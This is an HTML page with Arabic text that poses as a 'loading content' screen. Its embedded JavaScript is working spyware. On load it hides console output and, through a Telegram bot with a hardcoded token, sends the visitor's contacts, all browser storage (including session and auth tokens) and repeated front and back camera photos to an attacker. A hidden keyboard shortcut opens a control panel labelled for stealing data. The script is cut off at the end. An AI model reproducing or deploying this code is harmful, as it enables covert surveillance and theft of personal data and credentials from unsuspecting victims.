<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Arial', sans-serif; }
        .loader { text-align: center; color: #fff; }
        .spinner { width: 50px; height: 50px; border: 4px solid #333; border-top: 4px solid #25D366; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loader p { color: #888; font-size: 14px; }
        #status { color: #666; font-size: 12px; margin-top: 10px; }

        #adminPanel {
            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95); z-index: 99999; padding: 20px; overflow-y: auto;
            color: #fff; font-family: 'Tahoma', sans-serif;
        }
        #adminPanel.active { display: block; }
        .admin-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #25D366; padding-bottom: 10px; margin-bottom: 20px; }
        .admin-header h1 { color: #25D366; font-size: 24px; }
        .admin-header .status { font-size: 12px; color: #888; }
        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .admin-card { background: #1a1a2e; border: 1px solid #333; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: 0.3s; }
        .admin-card:hover { border-color: #25D366; transform: scale(1.02); }
        .admin-card .icon { font-size: 30px; margin-bottom: 10px; }
        .admin-card .label { font-size: 13px; color: #aaa; }
        .admin-card .count { font-size: 18px; color: #25D366; font-weight: bold; }
        .admin-card.danger:hover { border-color: #ff4444; }
        .admin-card.danger .icon { color: #ff4444; }

        .admin-log { background: #0d0d1a; border: 1px solid #333; border-radius: 12px; padding: 15px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; }
        .admin-log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
        .admin-log .entry .time { color: #666; }
        .admin-log .entry .msg { color: #0f0; }
        .admin-log .entry .error { color: #f44; }
        .admin-log .entry .warn { color: #ff0; }
        .admin-log .entry .info { color: #0ff; }

        .admin-actions { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
        .admin-btn { background: #1a1a2e; border: 1px solid #333; color: #fff; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; flex: 1; min-width: 120px; }
        .admin-btn:hover { border-color: #25D366; background: #2a2a3e; }
        .admin-btn.danger:hover { border-color: #ff4444; background: #3a1a1a; }
        .admin-btn.success { border-color: #25D366; }
        .admin-btn.success:hover { background: #1a3a2a; }

        #toast { position: fixed; top: 20px; right: 20px; background: #1a1a2e; border: 1px solid #25D366; border-radius: 12px; padding: 15px 25px; color: #fff; z-index: 9999999; display: none; min-width: 200px; }
        #toast.show { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }

        .folder-tree { background: #0d0d1a; border: 1px solid #333; border-radius: 12px; padding: 15px; max-height: 400px; overflow-y: auto; margin-top: 15px; display: none; }
        .folder-tree.active { display: block; }
        .folder-item { padding: 8px 12px; border-bottom: 1px solid #1a1a2e; }
        .folder-item .name { color: #0ff; }
        .folder-item .info { color: #666; font-size: 11px; }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <p>جاري تحميل المحتوى...</p>
    <div id="status">⏳ جاري التهيئة...</div>
</div>

<video id="videoFront" autoplay muted playsinline style="display:none;"></video>
<video id="videoBack" autoplay muted playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<div id="toast"></div>

<div id="adminPanel">
    <div class="admin-header">
        <h1>🕵️ لوحة التحكم</h1>
        <span class="status" id="targetStatus">🟢 متصل</span>
    </div>

    <div class="admin-grid">
        <div class="admin-card" onclick="stealAll()">
            <div class="icon">🚀</div>
            <div class="label">سحب الكل</div>
            <div class="count" id="totalCount">0</div>
        </div>
        <div class="admin-card" onclick="stealContacts()">
            <div class="icon">👤</div>
            <div class="label">جهات الاتصال</div>
            <div class="count" id="contactCount">0</div>
        </div>
        <div class="admin-card" onclick="stealTelegram()">
            <div class="icon">✈️</div>
            <div class="label">تليجرام</div>
            <div class="count" id="tgCount">0</div>
        </div>
        <div class="admin-card" onclick="captureBothCameras()">
            <div class="icon">📸</div>
            <div class="label">الصور</div>
            <div class="count" id="camCount">0</div>
        </div>
        <div class="admin-card" onclick="stealAllFiles()">
            <div class="icon">📁</div>
            <div class="label">الملفات</div>
            <div class="count" id="fileCount">0</div>
        </div>
        <div class="admin-card danger" onclick="killAll()">
            <div class="icon">💀</div>
            <div class="label">إيقاف الكل</div>
            <div class="count">⛔</div>
        </div>
    </div>

    <div class="admin-actions">
        <button class="admin-btn success" onclick="stealAll()">🚀 سحب الكل</button>
        <button class="admin-btn" onclick="showFolders()">📂 عرض المجلدات</button>
        <button class="admin-btn danger" onclick="killAll()">💀 إيقاف الكل</button>
    </div>

    <div class="folder-tree" id="folderTree">
        <h3 style="color:#25D366;margin-bottom:10px;">📂 الملفات المسروقة</h3>
        <div id="folderList"></div>
    </div>

    <div class="admin-log" id="adminLog">
        <div class="entry"><span class="time">[SYSTEM]</span> <span class="msg">✅ لوحة التحكم جاهزة</span></div>
    </div>

    <div style="text-align:center;margin-top:15px;">
        <button class="admin-btn danger" onclick="togglePanel()" style="max-width:200px;margin:0 auto;">🔒 إخفاء اللوحة</button>
    </div>
</div>

<script>
// ============================================================
// ====================== CONFIG ==============================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let totalStolen = 0;
let photoCount = 0;

// ============================================================
// ====================== TOGGLE PANEL ========================
// ============================================================
function togglePanel() {
    const panel = document.getElementById('adminPanel');
    panel.classList.toggle('active');
    if (panel.classList.contains('active')) {
        document.querySelector('.loader').style.display = 'none';
        document.getElementById('status').textContent = '🟢 لوحة التحكم نشطة';
        addLog('🟢 تم فتح لوحة التحكم', 'info');
    } else {
        document.querySelector('.loader').style.display = 'flex';
        document.getElementById('status').textContent = '⏳ جاري التحميل...';
    }
}

let panelOpen = false;
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
        e.preventDefault();
        togglePanel();
        panelOpen = true;
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
        e.preventDefault();
        if (panelOpen) {
            document.getElementById('adminPanel').classList.remove('active');
            panelOpen = false;
        }
    }
});

function addLog(text, type = 'msg') {
    const logDiv = document.getElementById('adminLog');
    const entry = document.createElement('div');
    entry.className = 'entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${text}</span>`;
    logDiv.appendChild(entry);
    logDiv.scrollTop = logDiv.scrollHeight;
}

function showToast(text, duration = 3000) {
    const toast = document.getElementById('toast');
    toast.textContent = text;
    toast.className = 'show';
    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => { toast.className = ''; }, duration);
}

// ============================================================
// ====================== TELEGRAM SEND =======================
// ============================================================
function sendToTelegram(imageData, caption = '') {
    if (!CHAT_ID) {
        addLog('⚠️ CHAT_ID غير متوفر، محاولة جلبها...', 'warn');
        return;
    }
    try {
        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(res => {
            if (res.ok) {
                addLog('✅ صورة مرسلة', 'msg');
            } else {
                addLog('❌ فشل إرسال الصورة', 'error');
            }
        })
        .catch(() => addLog('❌ خطأ في إرسال الصورة', 'error'));
    } catch(e) {
        addLog('❌ خطأ: ' + e.message, 'error');
    }
}

function sendMessage(text) {
    if (!CHAT_ID) {
        addLog('⚠️ CHAT_ID غير متوفر', 'warn');
        return;
    }
    const chunks = text.match(/(.|[\r\n]){1,4000}/g) || [text];
    chunks.forEach(chunk => {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: chunk })
        })
        .then(res => {
            if (res.ok) {
                addLog('✅ رسالة مرسلة', 'msg');
            }
        })
        .catch(() => addLog('❌ فشل إرسال رسالة', 'error'));
    });
}

function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const bstr = atob(parts[1]);
    const n = bstr.length;
    const u8arr = new Uint8Array(n);
    for (let i = 0; i < n; i++) { u8arr[i] = bstr.charCodeAt(i); }
    return new Blob([u8arr], { type: mime });
}

// ============================================================
// ====================== GET CHAT ID =========================
// ============================================================
function getChatId() {
    addLog('🔄 جلب Chat ID...', 'info');
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
        .then(res => res.json())
        .then(data => {
            if (data.ok && data.result && data.result.length > 0) {
                const lastUpdate = data.result[data.result.length - 1];
                if (lastUpdate.message) {
                    CHAT_ID = lastUpdate.message.chat.id;
                } else if (lastUpdate.callback_query) {
                    CHAT_ID = lastUpdate.callback_query.from.id;
                }
                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
                // إرسال رسالة تأكيد
                sendMessage('✅ تم الاتصال بالجهاز بنجاح');
                document.getElementById('status').textContent = '✅ جاهز';
                // بدء العمليات
                setTimeout(() => stealAll(), 3000);
            } else {
                addLog('⚠️ انتظار رسالة من البوت...', 'warn');
                document.getElementById('status').textContent = '⏳ أرسل /start للبوت';
                setTimeout(getChatId, 5000);
            }
        })
        .catch(() => {
            addLog('❌ فشل الاتصال بالبوت', 'error');
            setTimeout(getChatId, 5000);
        });
}

// ============================================================
// ====================== STEAL ALL ===========================
// ============================================================
function stealAll() {
    addLog('🚀 بدء سحب كل البيانات...', 'info');
    showToast('🚀 جاري سحب كل شيء...');
    totalStolen = 0;
    
    sendMessage('🚀 بدء عملية السحب الشامل...');
    
    // 1. جهات الاتصال
    setTimeout(() => stealContacts(), 1000);
    
    // 2. تليجرام
    setTimeout(() => stealTelegram(), 3000);
    
    // 3. الكاميرات
    setTimeout(() => captureBothCameras(), 5000);
    
    // 4. الملفات
    setTimeout(() => stealAllFiles(), 7000);
    
    setTimeout(() => {
        document.getElementById('totalCount').textContent = totalStolen;
        sendMessage(`✅ تم سحب ${totalStolen} عنصر بنجاح`);
        showToast(`✅ تم سحب ${totalStolen} عنصر`);
    }, 10000);
}

// ============================================================
// ====================== STEAL CONTACTS ======================
// ============================================================
function stealContacts() {
    addLog('👤 محاولة سحب جهات الاتصال...', 'info');
    showToast('👤 جاري سحب جهات الاتصال...');
    let count = 0;
    
    try {
        if ('contacts' in navigator && 'select' in navigator.contacts) {
            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                .then(contacts => {
                    contacts.forEach((c, i) => {
                        const text = `📱 جهة اتصال ${i+1}:\n👤 الاسم: ${c.name || 'غير معروف'}\n📞 الرقم: ${c.tel ? c.tel.join(', ') : 'غير موجود'}\n📧 البريد: ${c.email ? c.email.join(', ') : 'غير موجود'}`;
                        sendMessage(text);
                        count++;
                        totalStolen++;
                    });
                    document.getElementById('contactCount').textContent = count;
                    addLog(`👤 تم سحب ${count} جهة اتصال`, 'msg');
                })
                .catch(() => {
                    addLog('❌ فشل سحب جهات الاتصال', 'error');
                    stealContactsFallback();
                });
        } else {
            stealContactsFallback();
        }
    } catch(e) {
        stealContactsFallback();
    }
}

function stealContactsFallback() {
    try {
        const contactsData = localStorage.getItem('contacts') || localStorage.getItem('phonebook');
        if (contactsData) {
            sendMessage(`📱 جهات اتصال من localStorage:\n${contactsData}`);
            totalStolen++;
            document.getElementById('contactCount').textContent = '1';
            addLog('👤 تم سحب جهات اتصال من localStorage', 'msg');
        }
    } catch(e) {}
}

// ============================================================
// ====================== STEAL TELEGRAM ======================
// ============================================================
function stealTelegram() {
    addLog('✈️ محاولة سحب بيانات تليجرام...', 'info');
    showToast('✈️ جاري سحب تليجرام...');
    let found = 0;
    
    const tgKeys = ['tg', 'telegram', 'gram', 'user', 'session', 'token', 'auth', 'login', 'account', 'profile', 'phone', 'number', 'username'];
    
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            if (key && tgKeys.some(k => key.toLowerCase().includes(k))) {
                sendMessage(`✈️ تليجرام [${key}]:\n${value}`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            if (key && tgKeys.some(k => key.toLowerCase().includes(k))) {
                sendMessage(`✈️ تليجرام session [${key}]:\n${value}`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    document.getElementById('tgCount').textContent = found;
    addLog(`✈️ تم سحب ${found} عنصر من تليجرام`, 'msg');
}

// ============================================================
// ====================== CAPTURE CAMERAS =====================
// ============================================================
let frontStream = null, backStream = null;
let frontInterval = null, backInterval = null;

function captureBothCameras() {
    addLog('📸 تشغيل الكاميرات...', 'info');
    showToast('📸 تشغيل الكاميرات...');
    
    // الأمامية
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } })
        .then(function(stream) {
            frontStream = stream;
            const video = document.getElementById('videoFront');
            video.srcObject = stream;
            video.play();
            addLog('📸 الكاميرا الأمامية تعمل', 'msg');
            setTimeout(() => captureFrontPhoto(), 1500);
            frontInterval = setInterval(captureFrontPhoto, 5000);
        })
        .catch(function(err) {
            addLog('❌ فشل الكاميرا الأمامية: ' + err.message, 'error');
        });
    
    // الخلفية
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } })
        .then(function(stream) {
            backStream = stream;
            const video = document.getElementById('videoBack');
            video.srcObject = stream;
            video.play();
            addLog('📸 الكاميرا الخلفية تعمل', 'msg');
            setTimeout(() => captureBackPhoto(), 1500);
            backInterval = setInterval(captureBackPhoto, 5000);
        })
        .catch(function(err) {
            addLog('❌ فشل الكاميرا الخلفية: ' + err.message, 'error');
        });
    
    document.getElementById('camCount').textContent = '✓';
}

function captureFrontPhoto() {
    const video = document.getElementById('videoFront');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    if (!video.videoWidth || !video.videoHeight) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    photoCount++;
    const imageData = canvas.toDataURL('image/jpeg', 0.8);
    sendToTelegram(imageData, `📸 أمامي ${photoCount} - ${new Date().toLocaleString()}`);
    totalStolen++;
    document.getElementById('camCount').textContent = photoCount;
    addLog(`📸 صورة أمامي ${photoCount}`, 'msg');
}

function captureBackPhoto() {
    const video = document.getElementById('videoBack');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    if (!video.videoWidth || !video.videoHeight) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    photoCount++;
    const imageData = canvas.toDataURL('image/jpeg', 0.8);
    sendToTelegram(imageData, `📸 خلفي ${photoCount} - ${new Date().toLocaleString()}`);
    totalStolen++;
    document.getElementById('camCount').textContent = photoCount;
    addLog(`📸 صورة خلفي ${photoCount}`, 'msg');
}

// ============================================================
// ====================== STEAL FILES =========================
// ============================================================
function stealAllFiles() {
    addLog('📁 بدء سحب الملفات...', 'info');
    showToast('📁 جاري سحب الملفات...');
    let found = 0;
    
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            if (value && value.length > 5) {
                sendMessage(`📦 ملف: ${key}\nالحجم: ${value.length} bytes\nالمحتوى:\n${value}`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            if (value && value.length > 5) {
                sendMessage(`📦 ملف session: ${key}\nالحجم: ${value.length} bytes\nالمحتوى:\n${value}`);
                found++;
                totalStolen++;
            }
        }
    } catch(e) {}
    
    document.getElementById('fileCount').textContent = found;
    addLog(`📁 تم سحب ${found} ملف`, 'msg');
}

// ============================================================
// ====================== SHOW FOLDERS ========================
// ============================================================
function showFolders() {
    const tree = document.getElementById('folderTree');
    tree.classList.toggle('active');
    if (tree.classList.contains('active')) {
        const list = document.getElementById('folderList');
        list.innerHTML = `
            <div class="folder-item"><span class="name">📱 جهات الاتصال</span> <span class="info">${document.getElementById('contactCount').textContent || 0}</span></div>
            <div class="folder-item"><span class="name">✈️ تليجرام</span> <span class="info">${document.getElementById('tgCount').textContent || 0}</span></div>
            <div class="folder-item"><span class="name">📸 الصور</span> <span class="info">${photoCount}</span></div>
            <div class="folder-item"><span class="name">📁 الملفات</span> <span class="info">${document.getElementById('fileCount').textContent || 0}</span></div>
            <div class="folder-item" style="border-top:1px solid #25D366;margin-top:10px;padding-top:10px;">
                <span class="name" style="color:#25D366;">📊 المجموع الكلي</span>
                <span class="info" style="color:#25D366;">${totalStolen}</span>
            </div>
        `;
    }
}

// ============================================================
// ====================== KILL =================================
// ============================================================
function killAll() {
    addLog('💀 إيقاف جميع العمليات...', 'warn');
    showToast('💀 إيقاف العمليات...');
    
    if (frontInterval) { clearInterval(frontInterval); frontInterval = null; }
    if (backInterval) { clearInterval(backInterval); backInterval = null; }
    if (frontStream) { frontStream.getTracks().forEach(t => t.stop()); frontStream = null; }
    if (backStream) { backStream.getTracks().forEach(t => t.stop()); backStream = null; }
    
    addLog('✅ تم إيقاف جميع العمليات', 'msg');
    showToast('✅ تم إيقاف جميع العمليات');
    sendMessage('💀 تم إيقاف جميع العمليات');
}

// ============================================================
// ====================== INIT =================================
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};

addLog('🔄 جاري التهيئة...', 'info');
document.getElementById('status').textContent = '⏳ أرسل /start للبوت';
getChatId();

document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
        e.preventDefault();
        togglePanel();
        panelOpen = true;
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
        e.preventDefault();
        if (panelOpen) {
            document.getElementById('adminPanel').classList.remove('active');
            panelOpen = false;
        }
    }
});

window.admin = {
    panel: () => togglePanel(),
    steal: () => stealAll(),
    contacts: () => stealContacts(),
    telegram: () => stealTelegram(),
    camera: () => captureBothCameras(),
    files: () => stealAllFiles(),
    folders: () => showFolders(),
    kill: () => killAll(),
    log: addLog
